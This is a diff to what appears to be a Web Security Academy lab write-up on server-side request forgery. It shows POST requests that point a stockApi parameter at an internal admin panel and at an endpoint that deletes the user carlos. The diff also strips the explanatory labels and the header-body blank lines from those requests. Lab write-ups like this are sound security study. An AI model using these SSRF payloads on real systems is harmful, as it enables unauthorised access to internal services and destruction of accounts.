@@ -76,11 +76,10 @@ POST /product/stock HTTP/2
 Host: 0ae3002803aef186809c354400340003.web-security-academy.net
 Cookie: session=Q9n7eU2KT6zIgGFFzQs5LPmsQz57swIL
 Content-Type: application/x-www-form-urlencoded
-
 stockApi=http://192.168.0.64:8080/admin
 
 
-Reflected Output (Admin Panel via SSRF):
+Reflected Output:
 
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
@@ -100,14 +99,13 @@ Content-Length: 3243
 </html>
 
 
-Modified Request (Delete User carlos):
+Modified Request:
 
 POST /product/stock HTTP/2
 Host: 0ae3002803aef186809c354400340003.web-security-academy.net
 Cookie: session=Q9n7eU2KT6zIgGFFzQs5LPmsQz57swIL
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 62
-
 stockApi=http://192.168.0.64:8080/admin/delete?username=carlos
 
 
